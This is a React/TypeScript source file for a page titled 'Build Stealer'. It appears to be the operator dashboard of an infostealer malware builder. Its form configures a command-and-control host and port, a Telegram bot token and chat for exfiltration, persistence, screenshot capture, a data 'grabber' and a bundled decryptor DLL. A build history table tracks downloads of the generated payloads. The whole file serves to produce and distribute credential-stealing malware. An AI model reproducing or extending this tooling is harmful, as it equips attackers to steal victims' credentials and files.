import { useState } from 'react'
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query'
import { api } from '@/lib/api'
import { Button } from '@/components/ui/button'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table'
import { Skeleton } from '@/components/ui/skeleton'
import { Hammer, Download, Loader2 } from 'lucide-react'

interface BuildConfig {
  c2_host: string
  c2_port: number
  telegram_token: string
  telegram_chat_id: string
  enable_persistence: boolean
  enable_screenshot: boolean
  enable_grabber: boolean
  include_decryptor: boolean
  build_tag: string
}

interface BuildRecord {
  id: string
  file_size: number
  sha256: string
  build_tag: string
  download_count: number
  created_at: string
}

interface BuildResponse {
  build_id: string
  file_size: number
  sha256: string
}

export default function BuildPage() {
  const queryClient = useQueryClient()
  const [config, setConfig] = useState<BuildConfig>({
    c2_host: '127.0.0.1', c2_port: 8443,
    telegram_token: '', telegram_chat_id: '',
    enable_persistence: false, enable_screenshot: true,
    enable_grabber: true, include_decryptor: true,
    build_tag: '',
  })

  const buildsQuery = useQuery({
    queryKey: ['builds'],
    queryFn: () => api.get<{ builds: BuildRecord[] }>('/api/build'),
  })

  const buildMutation = useMutation({
    mutationFn: () => api.post<BuildResponse>('/api/build', config),
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['builds'] })
    },
  })

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    buildMutation.mutate()
  }

  return (
    <div className="space-y-6">
      <h1 className="text-2xl font-bold">Build Stealer</h1>

      <Card>
        <CardHeader><CardTitle className="text-sm font-medium">Configuration</CardTitle></CardHeader>
        <CardContent>
          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="grid gap-4 md:grid-cols-2">
              <div className="space-y-2">
                <Label htmlFor="c2_host">C2 Host</Label>
                <Input id="c2_host" value={config.c2_host} onChange={e => setConfig(c => ({ ...c, c2_host: e.target.value }))} required />
              </div>
              <div className="space-y-2">
                <Label htmlFor="c2_port">C2 Port</Label>
                <Input id="c2_port" type="number" min={1} max={65535} value={config.c2_port} onChange={e => setConfig(c => ({ ...c, c2_port: parseInt(e.target.value) || 8443 }))} />
              </div>
              <div className="space-y-2">
                <Label htmlFor="tg_token">Telegram Bot Token</Label>
                <Input id="tg_token" value={config.telegram_token} onChange={e => setConfig(c => ({ ...c, telegram_token: e.target.value }))} />
              </div>
              <div className="space-y-2">
                <Label htmlFor="tg_chat">Telegram Chat ID</Label>
                <Input id="tg_chat" value={config.telegram_chat_id} onChange={e => setConfig(c => ({ ...c, telegram_chat_id: e.target.value }))} />
              </div>
              <div className="space-y-2">
                <Label htmlFor="build_tag">Build Tag</Label>
                <Input id="build_tag" placeholder="my_first_build" value={config.build_tag} onChange={e => setConfig(c => ({ ...c, build_tag: e.target.value }))} />
              </div>
            </div>

            <div className="flex flex-wrap gap-4">
              <label className="flex items-center gap-2 text-sm">
                <input type="checkbox" checked={config.enable_screenshot} onChange={e => setConfig(c => ({ ...c, enable_screenshot: e.target.checked }))} />
                Enable Screenshot
              </label>
              <label className="flex items-center gap-2 text-sm">
                <input type="checkbox" checked={config.enable_persistence} onChange={e => setConfig(c => ({ ...c, enable_persistence: e.target.checked }))} />
                Enable Persistence
              </label>
              <label className="flex items-center gap-2 text-sm">
                <input type="checkbox" checked={config.enable_grabber} onChange={e => setConfig(c => ({ ...c, enable_grabber: e.target.checked }))} />
                Enable Grabber
              </label>
              <label className="flex items-center gap-2 text-sm">
                <input type="checkbox" checked={config.include_decryptor} onChange={e => setConfig(c => ({ ...c, include_decryptor: e.target.checked }))} />
                Include MirageDecryptor DLL
              </label>
            </div>

            <Button type="submit" disabled={buildMutation.isPending || !config.c2_host.trim()}>
              {buildMutation.isPending ? <Loader2 className="h-4 w-4 animate-spin mr-2" /> : <Hammer className="h-4 w-4 mr-2" />}
              {buildMutation.isPending ? 'Building...' : 'Build'}
            </Button>

            {buildMutation.data && (
              <div className="rounded-md bg-emerald-500/10 p-3 text-sm text-emerald-600 dark:text-emerald-400 space-y-1">
                <p>✅ Build complete</p>
                <p className="text-xs font-mono">Size: {(buildMutation.data.file_size / 1024).toFixed(1)} KB</p>
                <p className="text-xs font-mono">SHA256: {buildMutation.data.sha256}</p>
              </div>
            )}
            {buildMutation.error && (
              <div className="rounded-md bg-destructive/10 p-3 text-sm text-destructive">
                Build failed: {(buildMutation.error as Error).message}
              </div>
            )}
          </form>
        </CardContent>
      </Card>

      <Card>
        <CardHeader><CardTitle className="text-sm font-medium">Build History</CardTitle></CardHeader>
        <CardContent>
          <Table>
            <TableHeader>
              <TableRow>
                <TableHead>Tag</TableHead>
                <TableHead>Size</TableHead>
                <TableHead>SHA256</TableHead>
                <TableHead>Created</TableHead>
                <TableHead>Downloads</TableHead>
                <TableHead />
              </TableRow>
            </TableHeader>
            <TableBody>
              {buildsQuery.isLoading && Array.from({length: 3}).map((_, i) => (
                <TableRow key={i}><TableCell colSpan={6}><Skeleton className="h-8 w-full" /></TableCell></TableRow>
              ))}
              {buildsQuery.data?.builds.map(b => (
                <TableRow key={b.id}>
                  <TableCell className="font-mono text-xs">{b.build_tag || '—'}</TableCell>
                  <TableCell className="tabular-nums">{(b.file_size / 1024).toFixed(0)} KB</TableCell>
                  <TableCell className="font-mono text-xs text-muted-foreground">{b.sha256?.slice(0, 12)}..</TableCell>
                  <TableCell className="text-xs text-muted-foreground">{b.created_at}</TableCell>
                  <TableCell className="tabular-nums">{b.download_count}</TableCell>
                  <TableCell>
                    <a href={`/api/build/${b.id}/download`} download>
                      <Button variant="ghost" size="sm"><Download className="h-4 w-4" /></Button>
                    </a>
                  </TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </CardContent>
      </Card>
    </div>
  )
}
